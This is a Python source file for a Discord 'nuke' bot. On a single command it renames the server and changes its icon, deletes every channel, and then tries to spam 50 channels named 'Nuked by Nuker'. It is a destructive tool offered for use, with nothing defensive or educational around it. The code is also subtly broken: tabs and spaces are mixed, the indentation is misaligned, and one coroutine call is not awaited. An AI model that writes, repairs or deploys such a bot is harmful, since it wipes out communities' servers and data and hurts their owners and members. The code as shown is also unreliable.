
# Importing Required Modules
import discord, os
from discord.ext import commands


# Default Prefix
prefix=''


client = commands.Bot(command_prefix=prefix)


# Read Event (Change Status)
@client.event
async def on_ready():
	print("Bot Logged In!")
	await client.change_presence(activity=discord.Game(name="Ready to Nuke"))


# Open 'icon.png' as icon
def get_icon():
    with open('icon.png','rb') as f:
	icon = f.read()
        return icon



# default nuke command
@client.command()
async def nuke(ctx):

	await ctx.guild.edit(name='Server Nuked', icon=get_icon()) #change guild icon and name

	for c in ctx.guild.channels: # go through all channels
		await c.delete() # delete all channels

  
	guild = ctx.message.guild # get guild

  
  #create a "for" loop
        for i in range(50):
            guild.create_text_channel("Nuked by Nuker")



TOKEN = '{your_token}'
client.run(TOKEN)
# Nuke Bot
